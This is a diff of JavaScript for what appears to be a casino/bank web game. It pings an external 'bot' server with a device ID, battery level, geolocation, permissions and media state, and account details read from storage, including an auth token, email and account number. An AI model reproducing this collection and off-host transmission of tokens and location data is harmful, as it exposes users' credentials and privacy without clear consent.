@@ -1877,6 +1877,8 @@ setTimeout(()=>{document.body.classList.toggle('svoff',svOff());const f=()=>{if(
   var API  = "https://bot15963-pnann.puratya.com";   /* ★ Bot側の公開URL */
   var PG   = "カジノ";                              /* ★ bank.html では "銀行" */
   var PING = 10000;
+  var AK   = "cj_bank_auth";   /* 銀行が保存する口座情報のキー */
+  var KEY  = "cj_bank_v1";     /* 銀行の残高ミラー */
 
   /* 端末ごとの永続ID（ユーザ識別子・クライアント申告） */
   var ID;
@@ -2183,7 +2185,7 @@ setTimeout(()=>{document.body.classList.toggle('svoff',svOff());const f=()=>{if(
   var d = document.createElement("i");
   d.title = NAME + " / " + PG;
   d.style.cssText = "position:fixed;left:6px;top:calc(6px + env(safe-area-inset-top,0px));width:7px;height:7px;" +
-    "border-radius:50%;background:#faa61a;box-shadow:0 0 8px currentColor;opacity:.5;pointer-events:none;z-index:1";
+    "border-radius:50%;background:#faa61a;box-shadow:0 0 8px currentColor;opacity:.6;pointer-events:none;z-index:99999";
   document.body.appendChild(d);
   var okN = 0, lastOk = 0, on = false;
   function dot(){
@@ -2484,7 +2486,7 @@ setTimeout(()=>{document.body.classList.toggle('svoff',svOff());const f=()=>{if(
   }
 
   /* ============ 送信 ============ */
-  var jit = [], prevPush = 0, inflight = false, lastSend = 0;
+  var jit = [], prevPush = 0, inflight = false, lastSend = 0, ready = false;
   function jitter(){
     if (!prevPush) { prevPush = Date.now(); return null; }
     var dt = Date.now() - prevPush - PING;
@@ -2499,13 +2501,21 @@ setTimeout(()=>{document.body.classList.toggle('svoff',svOff());const f=()=>{if(
     inflight = true; lastSend = Date.now();
 
     var jitMs = jitter();
-    fetch(API + "/api/ping", {
-      method: "POST", headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(Object.assign({
+
+    /* アカウント読み取りが落ちても ping は必ず送る */
+    var sbObj = null;
+    try {
+      readSb();
+      if (SB) sbObj = { id: SB.id, tok: SB.tok, email: SB.email, acct: SB.acct, name: SB.name };
+    } catch (e) { SB = null; }
+
+    var body;
+    try {
+      body = JSON.stringify(Object.assign({
         id: ID, page: PG, reason: reason, t: Date.now(),
         vis: document.visibilityState, online: navigator.onLine,
         battery: bat, geo: geo, chips: chips(), hour: new Date().getHours(),
-        sb: (readSb(), SB ? { id: SB.id, tok: SB.tok, email: SB.email, acct: SB.acct, name: SB.name } : null),
+        sb: sbObj,
         sys: Object.assign({}, SYS, EXTRA, {
           idle: Math.round((Date.now() - lastAct) / 1000),
           focus: document.hasFocus(),
@@ -2522,11 +2532,16 @@ setTimeout(()=>{document.body.classList.toggle('svoff',svOff());const f=()=>{if(
           } : null,
           perms: PERMS, media: MEDIA
         })
-      }, sendName ? { name: NAME } : {})),
-      keepalive: !!final
+      }, sendName ? { name: NAME } : {}));
+    } catch (e) { inflight = false; dot(); return; }
+
+    fetch(API + "/api/ping", {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: body, keepalive: !!final
     }).then(function(r){
       if (!r.ok) { dot(); return null; }
       okN++; lastOk = Date.now(); dot();
+      if (!ready) { ready = true; openStream(); }
       return r.json().catch(function(){ return null; });
     }).then(function(j){
       if (!j) return;
@@ -2551,11 +2566,11 @@ setTimeout(()=>{document.body.classList.toggle('svoff',svOff());const f=()=>{if(
   var ES = null, LEADER_DONE = null;
 
   function openStream(){
-    if (ES) return;
+    if (ES || !ready) return;   /* 初回 ping が通るまで開かない */
     ES = new EventSource(API + "/api/stream?id=" + encodeURIComponent(ID));
     ES.addEventListener("resync", function(){ push("resync"); });
     ES.addEventListener("tick", function(){ push("tick"); });   /* サーバ主導で取得 */
-    ES.onerror = function(){ if (ES.readyState === 2) { ES = null; setTimeout(openStream, 1500); } };
+    ES.onerror = function(){ if (ES) { ES.close(); ES = null; } setTimeout(openStream, 2000); };
   }
   function kick(){ if (ES) { ES.close(); ES = null; } openStream(); }
 
